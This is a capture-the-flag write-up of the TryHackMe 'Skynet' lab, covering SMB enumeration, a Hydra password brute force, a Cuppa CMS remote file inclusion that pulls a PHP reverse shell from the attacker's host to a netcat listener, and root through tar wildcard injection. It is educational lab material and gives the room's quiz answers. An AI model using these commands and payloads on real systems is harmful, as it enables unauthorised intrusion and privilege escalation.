# Skynet - Tryhackme Writeup

<img width="577" height="93" alt="Image" src="https://github.com/user-attachments/assets/1276bd92-e322-4c9a-9f2f-b78887cf7435" />


A vulnerable Terminator themed Linux machine.
This room demonstrates how information disclosure and credential reuse can lead to user access, followed by privilege escalation via a misconfigured cron job.

### INFOs
- Difficulty: Easy
- Operating System: Linux
- Attack Type: Web + Credential reuse + Cron privilege escalation
  
## Enumeration
### Nmap Scan 
```
Command : Nmap -sV -sC <ip_address>
Nmap scan report for 10.67.184.186
Host is up (0.25s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Skynet
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL CAPA UIDL PIPELINING RESP-CODES TOP AUTH-RESP-CODE
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LOGINDISABLEDA0001 capabilities more IMAP4rev1 have ENABLE IDLE SASL-IR ID listed Pre-login LITERAL+ LOGIN-REFERRALS OK post-login
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m01s, deviation: 3h27m51s, median: 0s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-12-27T04:38:57
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2025-12-26T22:38:58-06:00
```
### SMBClient Scan
Listing the Smbshares 

<img width="759" height="362" alt="Image" src="https://github.com/user-attachments/assets/c326302c-c5be-43bf-85d2-ebb71b1a6818" />

 Go to the Anonymous Share 

 <img width="689" height="329" alt="Image" src="https://github.com/user-attachments/assets/edb032be-5402-4829-9576-d5666dcc45bb" />

Getting the files by the command ``` get <filename> ```

cat attention.txt
```
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson

```
cat log1.txt
```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```
log2.txt and log3.txt are empty 

## Now we go to the Website (port 80) :
<img width="1680" height="981" alt="Image" src="https://github.com/user-attachments/assets/a31590a7-9cc4-4f2e-9d6b-4fffa45094c5" />


### Gobuster Scan
```
Command : gobuster dir -u <ip_address> <wordlist>

/admin                (Status: 301) [Size: 314] [--> http://10.67.184.186/admin/]
/css                  (Status: 301) [Size: 312] [--> http://10.67.184.186/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.67.184.186/js/]
/config               (Status: 301) [Size: 315] [--> http://10.67.184.186/config/]
/ai                   (Status: 301) [Size: 311] [--> http://10.67.184.186/ai/]
/squirrelmail         (Status: 301) [Size: 321] [--> http://10.67.184.186/squirrelmail/]
                                                                                         
```
We got the Directory of /squirrelmail is interesting ...

<img width="1680" height="973" alt="Image" src="https://github.com/user-attachments/assets/9c607e4c-5396-452a-8095-0ebcc8e5881b" />

We go dive depper in it . we got to know about the sending the Request in the POST Method 

<img width="1680" height="974" alt="Image" src="https://github.com/user-attachments/assets/6ca66d87-28cf-425d-b803-4f2027547748" />

We tried the Sql injection but didn't get the any clues of it and tried the exploit of the squirrelmail sofware version all are failed after so we tried the Brute Force Attack 

### Hydra - Brute Force

```
 Command : hydra -l milesdyson -P log1.txt <ip_address1> http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect." -f


Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-27 10:46:30
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://10.67.184.186:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.
[80][http-post-form] host: 10.67.184.186   login: milesdyson   password: cyborg007haloterminator
[STATUS] attack finished for 10.67.184.186 (valid pair found)
1 of 1 target successfully completed, 1 valid password found

```
Question 1. What is Miles password for his emails?

Answer : cyborg007haloterminator

We got the Credentials of the milesdyson so try to logged in ...

<img width="1680" height="973" alt="Image" src="https://github.com/user-attachments/assets/e2fc4255-a2f5-488c-b778-11041378e965" />

See the email of Samba Password Reset from Skynet@Skynet 

```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```
We got the Credentials of the user milesdyson in the SMB Service based on that we try to log in...

```
Command : smbclient //<ip_address>/milesdyson -U milesdyson

Password for [WORKGROUP\milesdyson]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Sep 17 14:35:47 2019
  ..                                  D        0  Wed Sep 18 09:21:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 14:35:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 14:35:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 14:35:14 2019
  notes                               D        0  Tue Sep 17 14:48:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 14:35:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 14:35:14 2019

                9204224 blocks of size 1024. 5831500 blocks available
smb: \> cd notes
smb: \notes\> dir
  .                                   D        0  Tue Sep 17 14:48:40 2019
  ..                                  D        0  Tue Sep 17 14:35:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 14:31:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 14:31:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 14:31:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 14:31:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 14:31:29 2019
  important.txt                       N      117  Tue Sep 17 14:48:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 14:31:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 14:31:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 14:31:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 14:31:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 14:31:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 14:31:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 14:31:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 14:31:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 14:31:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 14:31:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 14:31:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 14:31:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 14:31:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 14:31:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 14:31:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 14:31:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 14:31:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 14:31:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 14:31:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 14:31:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 14:31:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 14:31:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 14:31:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 14:31:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 14:31:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 14:31:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 14:31:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 14:31:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 14:31:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 14:31:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 14:31:29 2019

                9204224 blocks of size 1024. 5831500 blocks available

```

cat important.txt 
```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

We got the hidden directory from the important.txt

Question 2. What is the hidden directory?

Answer : /45kra24zxs28v3yd

Go to the Directory of it http://<ip_address>/45kra24zxs28v3yd


<img width="1680" height="968" alt="Image" src="https://github.com/user-attachments/assets/ee7c4923-6b21-4b04-9094-a6d07aeae021" />


After we got the hidden directory so we dive deeper in it . do the directory scan 
```
Command : gobuster dir -u http//<ip_address>/45kra24zxs28v3yd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/administrator               (Status: 301) [Size: 333] [--> http://10.67.184.186/administrator/]
```

Found the another hidden directory 

<img width="1680" height="972" alt="Image" src="https://github.com/user-attachments/assets/e3cb406c-00fb-47ba-9b6a-d4053e91537c" />

It's a Cuppa CMS service running so we try to login with the default Credentials but not worked yet! 

Question 3. What is the vulnerability called when you can include a remote file for malicious purposes?

Answer : remote file inclusion 

## Exploitation

as of the Question 3 we have the idea of the CMS exploit of the RFI  . Search it on the google Cuppa CMS RFI we got the exploit in the ExploitDB : https://www.exploit-db.com/exploits/25971

Example Payload Template: http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?

Steps to exploit the Target :

Step 1 - Visit the site [Revshell](https://www.revshells.com/) Create a PHP reverse shell by giving the IP_ADDRESS of the local machine (Your ip_address) and PORT

if don't know to check the ip_address use the Command ``` ifconfig ``` Get your IP_ADDRESS

Step 2 - Start a Python web server to host the shell
 ``` python3 -m http.server 9000 ```
 
Step 3 - Open another Terminal and Start a netcat listener 
``` nc -lnvp 9001 ```

!!! Important the 9001 port is for the reverse shell use this port in the reverse_shell.php and 9000 port is for transfer the reverse shell file to the TARGET machine 

Payload : http://<ip_address>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<local_ip>:<port>/revshell.php 

<img width="1680" height="134" alt="Image" src="https://github.com/user-attachments/assets/74b34857-7404-461c-abcb-7894bad9006f" />

on the Netcat We got the Reverse Shell (WEB Shell) ✨

```
nc -lnvp 9001         
listening on [any] 9001 ...
connect to [192.168.150.101] from (UNKNOWN) [10.67.169.106] 47864
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 09:35:53 up 6 min,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```

To get the bash shell use the command : ``` python -c 'import pty;pty.spawn("/bin/bash")' ```


```
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@skynet:/$ cd home/milesdyson
cd home/milesdyson
www-data@skynet:/home/milesdyson$ cat user.txt
cat user.txt
7ce5############################

```

We Successfully go to the milesdyson folder and cat the USER.txt🎊

Question 3. What is the user flag?

Answer : 7ce5############################

## Privilege Escalation

```

www-data@skynet:/home/milesdyson$ ls
ls
backups  mail  share  user.txt
www-data@skynet:/home/milesdyson$ cd backups    
cd backups
www-data@skynet:/home/milesdyson/backups$ ls
ls
backup.sh  backup.tgz
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
After the research explains how to take advantage of the wildcard in the tar command using a technique called wildcard injection .
This script is executed by a root-owned cron job, which means any command executed by this script runs with root privileges.

Content : ``` backup.sh ```
```
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

The tar command uses a wildcard (*) to archive files.
When tar processes wildcard-expanded filenames, it also interprets filenames beginning with -- as command-line options.

To exploit this, malicious filenames were created inside /var/www/html
```
bash-4.3$ cd /var/www/html
cd /var/www/html
bash-4.3$ printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
bash-4.3$ echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint-action=exec=sh shell.sh"
bash-4.3$ echo "" > --checkpoint=1
echo "" > --checkpoint=1
bash-4.3$ ls
ls
--checkpoint-action=exec=sh shell.sh  admin   css         js
--checkpoint=1                        ai      image.png   shell.sh
45kra24zxs28v3yd                      config  index.html  style.css
```
We Created the shell.sh file that start a shell with the Root Privilege . So we use the /bin/bash -p to start another bash shell 
```
bash-4.3$ /bin/bash -p 
/bin/bash -p 
bash-4.3# whoami
whoami
root
bash-4.3# cd /root
cd /root
bash-4.3# ls
ls
root.txt
bash-4.3# cat root.txt
cat root.txt
3f037###########################
```

Question 4. What is the root flag?

Answer : 3f037###########################

We Successfully Got the Root Access and Root.txt 💥




<img src="https://github.com/user-attachments/assets/2d37580f-4592-4c2c-9d4b-1843d8dd1cfd" width="600">
